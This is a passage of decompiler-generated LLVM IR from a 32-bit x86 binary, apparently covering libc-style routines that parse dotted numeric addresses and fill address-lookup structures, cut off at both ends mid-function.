  %v3_804d4e3 = add i32 %v0_804d4db, %v2_804d4e3
  %v4_804d4e3 = inttoptr i32 %v3_804d4e3 to i16*
  %v5_804d4e3 = load i16, i16* %v4_804d4e3, align 2
  %v6_804d4e3 = zext i16 %v5_804d4e3 to i32
  store i32 %v6_804d4e3, i32* @eax, align 4
  %v2_804d4e7 = and i16 %v5_804d4e3, 8
  %v3_804d4e7 = icmp eq i16 %v2_804d4e7, 0
  br i1 %v3_804d4e7, label %dec_label_pc_804d500, label %dec_label_pc_804d4eb

dec_label_pc_804d4eb:                             ; preds = %dec_label_pc_804d4db
  br i1 %v1_804d4ee, label %dec_label_pc_804d4f5, label %dec_label_pc_804d4f0

dec_label_pc_804d4f0:                             ; preds = %dec_label_pc_804d4eb
  %tmp = icmp ult i8 %v2_804d52b51, 56
  br i1 %tmp, label %dec_label_pc_804d4f5, label %dec_label_pc_804d55c

dec_label_pc_804d4f5:                             ; preds = %dec_label_pc_804d4f0, %dec_label_pc_804d4eb
  %v4_804d4f7 = mul i32 %v4_804d54049, %v0_804d50010
  store i32 %v4_804d4f7, i32* @eax, align 4
  %v2_804d4fa = add i32 %v4_804d4f7, -48
  %v3_804d4fa = add i32 %v2_804d4fa, %v3_804d52b52
  br label %dec_label_pc_804d51d

dec_label_pc_804d500:                             ; preds = %dec_label_pc_804d4db
  br i1 %v1_804d503, label %dec_label_pc_804d531, label %dec_label_pc_804d505

dec_label_pc_804d505:                             ; preds = %dec_label_pc_804d500
  %v2_804d505 = and i32 %v6_804d4e3, 16
  %v3_804d505 = icmp eq i32 %v2_804d505, 0
  br i1 %v3_804d505, label %dec_label_pc_804d531, label %dec_label_pc_804d509

dec_label_pc_804d509:                             ; preds = %dec_label_pc_804d505
  store i32 0, i32* @eax, align 4
  %v2_804d516 = mul i32 %v4_804d54049, 16
  %v2_804d519 = add i32 %v2_804d516, -87
  br label %dec_label_pc_804d51d

dec_label_pc_804d51d:                             ; preds = %dec_label_pc_804d4f5, %dec_label_pc_804d509
  %v4_804d52b6 = phi i32 [ %v6_804d52b53, %dec_label_pc_804d4f5 ], [ %v2_804d516, %dec_label_pc_804d509 ]
  %storemerge = phi i32 [ %v3_804d4fa, %dec_label_pc_804d4f5 ], [ %v2_804d519, %dec_label_pc_804d509 ]
  %tmp105 = icmp ult i32 %storemerge, 256
  br i1 %tmp105, label %dec_label_pc_804d525, label %dec_label_pc_804d55c

dec_label_pc_804d525:                             ; preds = %dec_label_pc_804d51d
  %v1_804d525 = add i32 %v0_804d55250, 1
  %v1_804d52b = inttoptr i32 %v1_804d525 to i8*
  %v2_804d52b = load i8, i8* %v1_804d52b, align 1
  %v3_804d52b = zext i8 %v2_804d52b to i32
  %v5_804d52b = and i32 %v4_804d52b6, -256
  %v6_804d52b = or i32 %v3_804d52b, %v5_804d52b
  store i32 %v6_804d52b, i32* @edx, align 4
  %v4_804d52d = icmp eq i8 %v2_804d52b, 0
  %v1_804d52f = icmp eq i1 %v4_804d52d, false
  br i1 %v1_804d52f, label %dec_label_pc_804d4db, label %dec_label_pc_804d531.thread

dec_label_pc_804d531.thread:                      ; preds = %dec_label_pc_804d525
  br label %dec_label_pc_804d535

dec_label_pc_804d531:                             ; preds = %dec_label_pc_804d500, %dec_label_pc_804d505, %dec_label_pc_804d4d7
  %v0_804d531.lcssa = phi i32 [ %v0_804d53113, %dec_label_pc_804d4d7 ], [ %v0_804d53148, %dec_label_pc_804d505 ], [ %v0_804d53148, %dec_label_pc_804d500 ]
  %v4_804d540.lcssa = phi i32 [ 0, %dec_label_pc_804d4d7 ], [ %v4_804d54049, %dec_label_pc_804d505 ], [ %v4_804d54049, %dec_label_pc_804d500 ]
  %v0_804d552.lcssa = phi i32 [ %v0_804d52b4, %dec_label_pc_804d4d7 ], [ %v0_804d55250, %dec_label_pc_804d505 ], [ %v0_804d55250, %dec_label_pc_804d500 ]
  %v2_804d52b.lcssa = phi i8 [ %v2_804d52b41, %dec_label_pc_804d4d7 ], [ %v2_804d52b51, %dec_label_pc_804d505 ], [ %v2_804d52b51, %dec_label_pc_804d500 ]
  %v4_804d52d.lcssa = phi i1 [ true, %dec_label_pc_804d4d7 ], [ false, %dec_label_pc_804d505 ], [ false, %dec_label_pc_804d500 ]
  %v1_804d531 = icmp eq i32 %v0_804d531.lcssa, 0
  br i1 %v1_804d531, label %dec_label_pc_804d55c, label %dec_label_pc_804d535

dec_label_pc_804d535:                             ; preds = %dec_label_pc_804d531.thread, %dec_label_pc_804d531
  %v4_804d52d.lcssa102 = phi i1 [ true, %dec_label_pc_804d531.thread ], [ %v4_804d52d.lcssa, %dec_label_pc_804d531 ]
  %v2_804d52b.lcssa101 = phi i8 [ %v2_804d52b, %dec_label_pc_804d531.thread ], [ %v2_804d52b.lcssa, %dec_label_pc_804d531 ]
  %v0_804d552.lcssa100 = phi i32 [ %v1_804d525, %dec_label_pc_804d531.thread ], [ %v0_804d552.lcssa, %dec_label_pc_804d531 ]
  %v4_804d540.lcssa99 = phi i32 [ %storemerge, %dec_label_pc_804d531.thread ], [ %v4_804d540.lcssa, %dec_label_pc_804d531 ]
  %v3_804d535 = icmp eq i32 %v2_804d549, 0
  br i1 %v3_804d535, label %dec_label_pc_804d540, label %dec_label_pc_804d53b

dec_label_pc_804d53b:                             ; preds = %dec_label_pc_804d535
  %v5_804d53b = mul i32 %v3_804d53b, 256
  br label %dec_label_pc_804d540

dec_label_pc_804d540:                             ; preds = %dec_label_pc_804d535, %dec_label_pc_804d53b
  %v3_804d540 = phi i32 [ %v3_804d53b, %dec_label_pc_804d535 ], [ %v5_804d53b, %dec_label_pc_804d53b ]
  %v5_804d540 = or i32 %v3_804d540, %v4_804d540.lcssa99
  %v10_804d544 = icmp eq i8 %v2_804d52b.lcssa101, 46
  %v1_804d547 = icmp eq i1 %v10_804d544, false
  br i1 %v1_804d547, label %dec_label_pc_804d558, label %dec_label_pc_804d549

dec_label_pc_804d549:                             ; preds = %dec_label_pc_804d540
  %v11_804d54c = icmp eq i32 %v2_804d549, 3
  br i1 %v11_804d54c, label %dec_label_pc_804d55c, label %dec_label_pc_804d552

dec_label_pc_804d552:                             ; preds = %dec_label_pc_804d549
  %v3_804d549 = add i32 %v2_804d549, 1
  %v1_804d552 = add i32 %v0_804d552.lcssa100, 1
  br label %dec_label_pc_804d4aa

dec_label_pc_804d558:                             ; preds = %dec_label_pc_804d540
  br i1 %v4_804d52d.lcssa102, label %dec_label_pc_804d564, label %dec_label_pc_804d55c

dec_label_pc_804d55c:                             ; preds = %dec_label_pc_804d549, %dec_label_pc_804d531, %dec_label_pc_804d51d, %dec_label_pc_804d4f0, %dec_label_pc_804d558
  br label %dec_label_pc_804d564

dec_label_pc_804d564:                             ; preds = %dec_label_pc_804d558, %dec_label_pc_804d55c
  %v3_804d564 = phi i32 [ %v5_804d540, %dec_label_pc_804d558 ], [ -1, %dec_label_pc_804d55c ]
  ret i32 %v3_804d564

; uselistorder directives
  uselistorder i32 %v5_804d540, { 1, 0 }
  uselistorder i32 %v6_804d52b, { 1, 0 }
  uselistorder i32 %v3_804d52b, { 1, 0 }
  uselistorder i8 %v2_804d52b, { 0, 2, 3, 1 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v2_804d516, { 1, 0 }
  uselistorder i32 %v4_804d4f7, { 1, 0 }
  uselistorder i32 %v4_804d54049, { 2, 3, 1, 0 }
  uselistorder i8 %v2_804d52b51, { 1, 2, 0 }
  uselistorder i32 %v0_804d50010, { 0, 2, 1 }
  uselistorder i32 %v0_804d4b8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804d549, { 1, 0, 2 }
  uselistorder i32 %v3_804d53b, { 1, 0 }
  uselistorder label %dec_label_pc_804d564, { 1, 0 }
  uselistorder label %dec_label_pc_804d55c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804d540, { 1, 0 }
  uselistorder label %dec_label_pc_804d535, { 1, 0 }
  uselistorder label %dec_label_pc_804d531, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d51d, { 1, 0 }
  uselistorder label %dec_label_pc_804d4db, { 1, 0 }
  uselistorder label %dec_label_pc_804d4d7, { 2, 0, 1 }
}

define i32 @function_804d570(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d570:
  %stack_var_-4 = alloca i32, align 4
  %v2_804d573 = ptrtoint i32* %stack_var_-4 to i32
  %v2_804d57c = inttoptr i32 %arg1 to i8*
  %v3_804d57c = call i32 @function_80504fc(i8* %v2_804d57c, i32 %v2_804d573)
  store i32 -1, i32* @edx, align 4
  %v1_804d587 = icmp eq i32 %v3_804d57c, 0
  br i1 %v1_804d587, label %dec_label_pc_804d58f, label %dec_label_pc_804d58b

dec_label_pc_804d58b:                             ; preds = %dec_label_pc_804d570
  %v3_804d58b = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_804d58b, i32* @edx, align 4
  br label %dec_label_pc_804d58f

dec_label_pc_804d58f:                             ; preds = %dec_label_pc_804d570, %dec_label_pc_804d58b
  %v0_804d58f = phi i32 [ -1, %dec_label_pc_804d570 ], [ %v3_804d58b, %dec_label_pc_804d58b ]
  ret i32 %v0_804d58f

; uselistorder directives
  uselistorder label %dec_label_pc_804d58f, { 1, 0 }
}

define i32 @function_804d598(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d598:
  %stack_var_-4 = alloca i32, align 4
  %v0_804d59b = call i32 @function_804f828()
  %v0_804d5a0 = load i32, i32* @edx, align 4
  %v2_804d5a3 = ptrtoint i32* %stack_var_-4 to i32
  %v9_804d5bb = call i32 @function_804d5c8(i32 %arg1, i32* nonnull @global_var_805844c.135, i32 ptrtoint (i32* @global_var_8058280.134 to i32), i32 460, i32 %v2_804d5a3, i32 %v0_804d59b, i32 %v0_804d5a0, i32 %v0_804d5a0)
  %v3_804d5c0 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_804d5c0
}

define i32 @function_804d5c8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804d5c8:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_804d5c8 = load i32, i32* @ebp, align 4
  %v0_804d5c9 = load i32, i32* @edi, align 4
  %v0_804d5ca = load i32, i32* @esi, align 4
  %v0_804d5cb = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_804d5db = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_804d5db, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_804d5e6 = icmp eq i32 %arg1, 0
  br i1 %v4_804d5e6, label %dec_label_pc_804d8f2, label %dec_label_pc_804d5f1

dec_label_pc_804d5f1:                             ; preds = %dec_label_pc_804d5c8
  %v1_804d5f1 = call i32 @function_804b7f4(i32 %v0_804d5cb)
  store i32 %v1_804d5f1, i32* %eax.global-to-local, align 4
  %v1_804d5f6 = inttoptr i32 %v1_804d5f1 to i32*
  %v2_804d5f6 = load i32, i32* %v1_804d5f6, align 4
  store i32 %v2_804d5f6, i32* @edi, align 4
  store i32 %v1_804d5f1, i32* @esi, align 4
  store i32 0, i32* %v1_804d5f6, align 4
  %v0_804d609 = load i32, i32* @ebx, align 4
  store i32 %v0_804d609, i32* %stack_var_-108, align 4
  %v7_804d615 = call i32 @function_8050f28(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_804d609, i32 %arg5, i32 %arg6, i32 %v1_804d5f1)
  store i32 %v7_804d615, i32* %eax.global-to-local, align 4
  %v1_804d61d = icmp eq i32 %v7_804d615, 0
  br i1 %v1_804d61d, label %dec_label_pc_804d8f2, label %dec_label_pc_804d625

dec_label_pc_804d625:                             ; preds = %dec_label_pc_804d5f1
  %v1_804d629 = inttoptr i32 %arg6 to i32*
  %v2_804d629 = load i32, i32* %v1_804d629, align 4
  store i32 %v2_804d629, i32* %edx.global-to-local, align 4
  %v9_804d62b = icmp eq i32 %v2_804d629, 1
  br i1 %v9_804d62b, label %dec_label_pc_804d645, label %dec_label_pc_804d630

dec_label_pc_804d630:                             ; preds = %dec_label_pc_804d625
  %v9_804d630 = icmp eq i32 %v2_804d629, 4
  br i1 %v9_804d630, label %dec_label_pc_804d645, label %dec_label_pc_804d635

dec_label_pc_804d635:                             ; preds = %dec_label_pc_804d630
  %v1_804d635 = add i32 %v2_804d629, 1
  %v8_804d635 = icmp eq i32 %v1_804d635, 0
  store i32 %v1_804d635, i32* %edx.global-to-local, align 4
  %v1_804d636 = icmp eq i1 %v8_804d635, false
  br i1 %v1_804d636, label %dec_label_pc_804d8f2, label %dec_label_pc_804d63c

dec_label_pc_804d63c:                             ; preds = %dec_label_pc_804d635
  %v0_804d63c = load i32, i32* @esi, align 4
  %v1_804d63c = inttoptr i32 %v0_804d63c to i32*
  %v2_804d63c = load i32, i32* %v1_804d63c, align 4
  %v11_804d63c = icmp eq i32 %v2_804d63c, 2
  %v1_804d63f = icmp eq i1 %v11_804d63c, false
  br i1 %v1_804d63f, label %dec_label_pc_804d8f2, label %dec_label_pc_804d645

dec_label_pc_804d645:                             ; preds = %dec_label_pc_804d63c, %dec_label_pc_804d630, %dec_label_pc_804d625
  %v0_804d645 = load i32, i32* @ebp, align 4
  %v1_804d647 = sub i32 0, %v0_804d645
  %v1_804d649 = urem i32 %v1_804d647, 4
  %v2_804d649 = icmp eq i32 %v1_804d649, 0
  store i32 %v1_804d649, i32* %eax.global-to-local, align 4
  %v0_804d64c = load i32, i32* @edi, align 4
  %v1_804d64c = load i32, i32* @esi, align 4
  %v2_804d64c = inttoptr i32 %v1_804d64c to i32*
  store i32 %v0_804d64c, i32* %v2_804d64c, align 4
  %v0_804d660.pre = load i32, i32* @ebx, align 4
  br i1 %v2_804d649, label %dec_label_pc_804d65c, label %dec_label_pc_804d650

dec_label_pc_804d650:                             ; preds = %dec_label_pc_804d645
  %v1_804d650 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d650 = sub i32 %v0_804d660.pre, %v1_804d650
  %v7_804d650 = icmp ult i32 %v0_804d660.pre, %v1_804d650
  br i1 %v7_804d650, label %dec_label_pc_804d8ed, label %dec_label_pc_804d658

dec_label_pc_804d658:                             ; preds = %dec_label_pc_804d650
  %v0_804d658 = load i32, i32* @ebp, align 4
  %v2_804d658 = add i32 %v0_804d658, %v1_804d650
  store i32 %v2_804d658, i32* @ebp, align 4
  store i32 %v2_804d650, i32* @ebx, align 4
  br label %dec_label_pc_804d65c

dec_label_pc_804d65c:                             ; preds = %dec_label_pc_804d645, %dec_label_pc_804d658
  %v0_804d660 = phi i32 [ %v2_804d650, %dec_label_pc_804d658 ], [ %v0_804d660.pre, %dec_label_pc_804d645 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_804d629, align 4
  %tmp41 = icmp ult i32 %v0_804d660, 4
  br i1 %tmp41, label %dec_label_pc_804d8ed, label %dec_label_pc_804d66f

dec_label_pc_804d66f:                             ; preds = %dec_label_pc_804d65c
  %v0_804d66f = load i32, i32* @ebx, align 4
  %v1_804d66f = add i32 %v0_804d66f, -4
  store i32 %v1_804d66f, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_804d66f, 8
  br i1 %tmp42, label %dec_label_pc_804d8ed, label %dec_label_pc_804d67b

dec_label_pc_804d67b:                             ; preds = %dec_label_pc_804d66f
  %v1_804d67b = add i32 %v0_804d66f, -12
  store i32 %v1_804d67b, i32* %eax.global-to-local, align 4
  %v0_804d67e = load i32, i32* @ebp, align 4
  %v1_804d67e = add i32 %v0_804d67e, 4
  store i32 %v1_804d67e, i32* %edx.global-to-local, align 4
  store i32 %v1_804d67e, i32* %stack_var_-92, align 4
  %v3_804d687 = inttoptr i32 %v1_804d67e to i32*
  store i32 %v0_804d67e, i32* %v3_804d687, align 4
  %v0_804d68a = load i32, i32* %edx.global-to-local, align 4
  %v1_804d68a = add i32 %v0_804d68a, 4
  %v2_804d68a = inttoptr i32 %v1_804d68a to i32*
  store i32 0, i32* %v2_804d68a, align 4
  %tmp43 = icmp ult i32 %v1_804d67b, 32
  br i1 %tmp43, label %dec_label_pc_804d8ed, label %dec_label_pc_804d697

dec_label_pc_804d697:                             ; preds = %dec_label_pc_804d67b
  %v0_804d697 = load i32, i32* @ebx, align 4
  %v1_804d697 = add i32 %v0_804d697, -44
  store i32 %v1_804d697, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_804d697, 256
  br i1 %tmp44, label %dec_label_pc_804d8ed, label %dec_label_pc_804d6aa

dec_label_pc_804d6aa:                             ; preds = %dec_label_pc_804d697
  %v0_804d6aa = load i32, i32* @ebp, align 4
  %v1_804d6aa = add i32 %v0_804d6aa, 12
  %v1_804d6b1 = add i32 %v0_804d6aa, 44
  store i32 %v1_804d6b1, i32* @edi, align 4
  store i32 %v1_804d6b1, i32* %stack_var_-108, align 4
  %v3_804d6be = inttoptr i32 %v1_804d6b1 to i8*
  %v4_804d6be = call i32 @function_804d218(i8* %v3_804d6be, i32 %arg1, i32 %v1_804d697)
  %v0_804d6c3 = load i32, i32* @edi, align 4
  %v1_804d6c3 = load i32, i32* @ebp, align 4
  %v2_804d6c3 = add i32 %v1_804d6c3, 12
  %v3_804d6c3 = inttoptr i32 %v2_804d6c3 to i32*
  store i32 %v0_804d6c3, i32* %v3_804d6c3, align 4
  %v1_804d6ca = add i32 %v0_804d6aa, 16
  %v2_804d6ca = inttoptr i32 %v1_804d6ca to i32*
  store i32 0, i32* %v2_804d6ca, align 4
  %v2_804d6d1 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804d6d1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804d6d3 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804d6d8 = inttoptr i32 %arg1 to i8*
  %v3_804d6d8 = call i32 @function_80504fc(i8* %v2_804d6d8, i32 %v0_804d6d3)
  store i32 %v3_804d6d8, i32* %eax.global-to-local, align 4
  %v1_804d6e0 = icmp eq i32 %v3_804d6d8, 0
  br i1 %v1_804d6e0, label %dec_label_pc_804d71c, label %dec_label_pc_804d6e4

dec_label_pc_804d6e4:                             ; preds = %dec_label_pc_804d6aa
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804d6e8 = load i32, i32* @edi, align 4
  store i32 %v0_804d6e8, i32* %arg2, align 4
  %v1_804d6ea = add i32 %tmp18, 8
  %v2_804d6ea = inttoptr i32 %v1_804d6ea to i32*
  store i32 2, i32* %v2_804d6ea, align 4
  %v0_804d6f1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d6f1 = add i32 %v0_804d6f1, 12
  %v2_804d6f1 = inttoptr i32 %v1_804d6f1 to i32*
  store i32 4, i32* %v2_804d6f1, align 4
  %v2_804d6f8 = load i32, i32* %stack_var_-92, align 4
  %v1_804d6fb = load i32, i32* %edx.global-to-local, align 4
  %v2_804d6fb = add i32 %v1_804d6fb, 16
  %v3_804d6fb = inttoptr i32 %v2_804d6fb to i32*
  store i32 %v2_804d6f8, i32* %v3_804d6fb, align 4
  %v1_804d702 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d702 = add i32 %v1_804d702, 4
  %v3_804d702 = inttoptr i32 %v2_804d702 to i32*
  store i32 %v1_804d6aa, i32* %v3_804d702, align 4
  %v0_804d709 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804d709, i32* %v1_804d5db, align 4
  store i32 0, i32* %v1_804d629, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8f2

dec_label_pc_804d71c:                             ; preds = %dec_label_pc_804d6aa
  %v0_804d71c = call i32 @function_8050ce4()
  store i32 %v0_804d71c, i32* @eax, align 4
  %v2_804d72c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804d72c, i32* @ebx, align 4
  store i32 %v2_804d72c, i32* %stack_var_-108, align 4
  %v2_804d731 = call i32 @function_804f016(i32 %v2_804d72c, i32 134541331)
  store i32 %v2_804d731, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8055db0.136 to i32), i32* %stack_var_-108, align 4
  %v1_804d73d = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055db0.136 to i32))
  %v0_804d742 = load i32, i32* @global_var_8058a94.137, align 4
  store i32 %v0_804d742, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8055db0.136 to i32), i32* @ecx, align 4
  store i32 134541331, i32* @eax, align 4
  store i32 %v2_804d72c, i32* %stack_var_-108, align 4
  %v2_804d74d = call i32 @function_804f016(i32 %v2_804d72c, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804d768 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804d76d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804d76d, i32* %eax.global-to-local, align 4
  store i32 %v2_804d76d, i32* %stack_var_-108, align 4
  %v0_804d777 = load i32, i32* @esi, align 4
  %v7_804d77e = call i32 @function_8050590(i8* %v2_804d6d8, i32 1, i32 %v0_804d777, i32 ptrtoint (i32* @global_var_8058a88.138 to i32), i32 %v2_804d76d, i32 %v2_804d768)
  store i32 %v7_804d77e, i32* %eax.global-to-local, align 4
  %v2_804d786 = icmp slt i32 %v7_804d77e, 0
  %v1_804d788 = icmp eq i1 %v2_804d786, false
  br i1 %v1_804d788, label %dec_label_pc_804d79e, label %dec_label_pc_804d78a

dec_label_pc_804d78a:                             ; preds = %dec_label_pc_804d71c
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804d629, align 4
  br label %dec_label_pc_804d8f2

dec_label_pc_804d79e:                             ; preds = %dec_label_pc_804d71c
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804d7b1 = icmp ugt i32 %v1_804d697, 256
  %v15_804d7b1 = icmp eq i32 %v0_804d697, 300
  %v2_804d7b5 = or i1 %v10_804d7b1, %v15_804d7b1
  br i1 %v2_804d7b5, label %dec_label_pc_804d850, label %dec_label_pc_804d7b7

dec_label_pc_804d7b7:                             ; preds = %dec_label_pc_804d79e
  %v3_804d7ba = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804d7ba, i32* %stack_var_-108, align 4
  %v1_804d7be = call i32 @function_804e481(i32 %v3_804d7ba)
  store i32 %v1_804d7be, i32* %eax.global-to-local, align 4
  store i32 %v3_804d7ba, i32* @edi, align 4
  %v3_804d7c4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d7c4, i32* %stack_var_-108, align 4
  %v1_804d7c8 = call i32 @function_804e481(i32 %v3_804d7c4)
  store i32 -1, i32* %v1_804d629, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8c8

dec_label_pc_804d850:                             ; preds = %dec_label_pc_804d79e
  %v3_804d855.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804d859.pre = load i32, i32* @edi, align 4
  store i32 %v0_804d859.pre, i32* %stack_var_-108, align 4
  %v3_804d85a = inttoptr i32 %v0_804d859.pre to i8*
  %v4_804d85a = call i32 @function_804d218(i8* %v3_804d85a, i32 %v3_804d855.pre, i32 %v1_804d697)
  store i32 %v4_804d85a, i32* %eax.global-to-local, align 4
  %v3_804d860 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804d860, i32* %stack_var_-108, align 4
  %v1_804d864 = call i32 @function_804e481(i32 %v3_804d860)
  store i32 %v1_804d864, i32* %eax.global-to-local, align 4
  %v12_804d86c = icmp eq i32 %tmp10, 1
  %v1_804d871 = icmp eq i1 %v12_804d86c, false
  br i1 %v1_804d871, label %dec_label_pc_804d8cd, label %dec_label_pc_804d873

dec_label_pc_804d873:                             ; preds = %dec_label_pc_804d850
  %v0_804d873 = load i32, i32* @edx, align 4
  %v0_804d87a = load i32, i32* @ebp, align 4
  store i32 %v0_804d87a, i32* %stack_var_-108, align 4
  %v3_804d87b = inttoptr i32 %tmp to i16*
  %v4_804d87b = call i32 @function_804d1a8(i16* %v3_804d87b, i32 4, i32 %v0_804d873)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804d884 = load i32, i32* @edi, align 4
  store i32 %v0_804d884, i32* %arg2, align 4
  %v1_804d886 = add i32 %tmp18, 8
  %v2_804d886 = inttoptr i32 %v1_804d886 to i32*
  store i32 2, i32* %v2_804d886, align 4
  %v0_804d88d = load i32, i32* %eax.global-to-local, align 4
  %v1_804d88d = add i32 %v0_804d88d, 12
  %v2_804d88d = inttoptr i32 %v1_804d88d to i32*
  store i32 4, i32* %v2_804d88d, align 4
  %v3_804d894 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804d894, i32* %edx.global-to-local, align 4
  %v1_804d898 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d898 = add i32 %v1_804d898, 16
  %v3_804d898 = inttoptr i32 %v2_804d898 to i32*
  store i32 %v3_804d894, i32* %v3_804d898, align 4
  %v1_804d89f = load i32, i32* %eax.global-to-local, align 4
  %v2_804d89f = add i32 %v1_804d89f, 4
  %v3_804d89f = inttoptr i32 %v2_804d89f to i32*
  store i32 %v1_804d6aa, i32* %v3_804d89f, align 4
  %v2_804d8a2 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804d8a2, i32* %eax.global-to-local, align 4
  %v3_804d8a3 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d8a3, i32* %stack_var_-108, align 4
  %v1_804d8a7 = call i32 @function_804e481(i32 %v3_804d8a3)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804d5db, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d629, align 4
  br label %dec_label_pc_804d8c8

dec_label_pc_804d8c8:                             ; preds = %dec_label_pc_804d8cd, %dec_label_pc_804d7b7, %dec_label_pc_804d873
  br label %dec_label_pc_804d8f2

dec_label_pc_804d8cd:                             ; preds = %dec_label_pc_804d850
  %v3_804d8d0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d8d0, i32* %stack_var_-108, align 4
  %v1_804d8d4 = call i32 @function_804e481(i32 %v3_804d8d0)
  store i32 1, i32* %v1_804d629, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8c8

dec_label_pc_804d8ed:                             ; preds = %dec_label_pc_804d697, %dec_label_pc_804d67b, %dec_label_pc_804d66f, %dec_label_pc_804d65c, %dec_label_pc_804d650
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d8f2

dec_label_pc_804d8f2:                             ; preds = %dec_label_pc_804d63c, %dec_label_pc_804d635, %dec_label_pc_804d5f1, %dec_label_pc_804d5c8, %dec_label_pc_804d8c8, %dec_label_pc_804d78a, %dec_label_pc_804d6e4, %dec_label_pc_804d8ed
  store i32 %v0_804d5cb, i32* @ebx, align 4
  store i32 %v0_804d5ca, i32* @esi, align 4
  store i32 %v0_804d5c9, i32* @edi, align 4
  store i32 %v0_804d5c8, i32* @ebp, align 4
  %v0_804d8f9 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804d8f9

; uselistorder directives
  uselistorder i32 %v2_804d72c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804d6b1, { 1, 0, 2 }
  uselistorder i32 %v1_804d6aa, { 1, 0 }
  uselistorder i32 %v1_804d697, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804d660.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804d649, { 1, 0 }
  uselistorder i32 %v2_804d629, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804d629, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804d5db, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804d8f2, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804d8c8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d65c, { 1, 0 }
}

define i32 @function_804d8fc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d8fc:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804d917 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804d91e = call i32 @function_804f368(i32 5, i32 %v2_804d917)
  ret i32 %v2_804d91e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804d928(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d928:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804d943 = ptrtoint i32* %stack_var_-12 to i32
